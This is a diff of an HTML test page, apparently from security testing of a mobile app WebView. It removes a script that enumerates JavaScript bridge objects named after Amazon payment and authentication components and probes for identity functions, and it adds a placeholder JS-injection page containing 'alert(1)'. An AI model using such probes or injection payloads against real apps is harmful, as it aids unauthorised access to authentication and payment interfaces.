@@ -1,97 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Bridge Exploit Test</title>
-    <meta charset="utf-8">
+    <title>JS Injection Test</title>
 </head>
 <body>
-    <h1>Amazon JSI Bridge Detection Active</h1>
-    <div id="output"></div>
-    
+    <h1>JS Injection Test</h1>
     <script>
-        function log(msg) {
-            document.getElementById('output').innerHTML += msg + '<br>';
-            console.log(msg);
-        }
-        
-        // Immediate execution
-        log('[+] HTML Payload Loaded Successfully');
-        log('[+] Location: ' + window.location.href);
-        log('[+] User Agent: ' + navigator.userAgent);
-        
-        // Bridge detection
-        setTimeout(function() {
-            log('[+] Starting bridge detection...');
-            
-            var bridges = [];
-            for (var key in window) {
-                if (key.toLowerCase().includes('jsi') || 
-                    key.toLowerCase().includes('bridge') ||
-                    key.toLowerCase().includes('android')) {
-                    bridges.push(key);
-                }
-            }
-            
-            if (bridges.length > 0) {
-                log('[CRITICAL] Found bridges: ' + bridges.join(', '));
-                
-                // Test CacheManagerJSI specifically
-                if (window.CacheManagerJSI) {
-                    log('[CRITICAL] CacheManagerJSI detected!');
-                    try {
-                        if (typeof window.CacheManagerJSI.getCallerAuthContext === 'function') {
-                            log('[EXPLOIT] getCallerAuthContext available');
-                        }
-                        if (typeof window.CacheManagerJSI.getCallerIdentity === 'function') {
-                            log('[EXPLOIT] getCallerIdentity available');
-                        }
-                    } catch(e) {
-                        log('[INFO] CacheManagerJSI access restricted: ' + e.message);
-                    }
-                }
-                
-                // Test other payment bridges
-                if (window.SecureStorageJSI) {
-                    log('[CRITICAL] SecureStorageJSI detected!');
-                }
-                
-                if (window.MAPAndroidJSBridge) {
-                    log('[CRITICAL] MAPAndroidJSBridge detected!');
-                }
-                
-                if (window.FidoAuthenticatorJSBridge) {
-                    log('[CRITICAL] FidoAuthenticatorJSBridge detected!');
-                }
-                
-            } else {
-                log('[INFO] No obvious bridges found in window object');
-            }
-            
-            // Try to access payment-specific functionality
-            try {
-                if (window.webkit && window.webkit.messageHandlers) {
-                    log('[INFO] WebKit message handlers present');
-                }
-            } catch(e) {
-                log('[INFO] WebKit access failed: ' + e.message);
-            }
-            
-        }, 1000);
-        
-        // Delayed bridge enumeration
-        setTimeout(function() {
-            log('[+] Full window enumeration:');
-            var allKeys = Object.keys(window).filter(k => 
-                k.toLowerCase().includes('jsi') || 
-                k.toLowerCase().includes('bridge') ||
-                k.toLowerCase().includes('android') ||
-                k.toLowerCase().includes('payment') ||
-                k.toLowerCase().includes('auth') ||
-                k.toLowerCase().includes('amazon')
-            );
-            log('[INFO] Filtered keys: ' + allKeys.join(', '));
-        }, 2000);
-        
+        alert(1);
+        // Your injection code here
+        console.log("JS Injection executed!");
     </script>
 </body>
 </html>
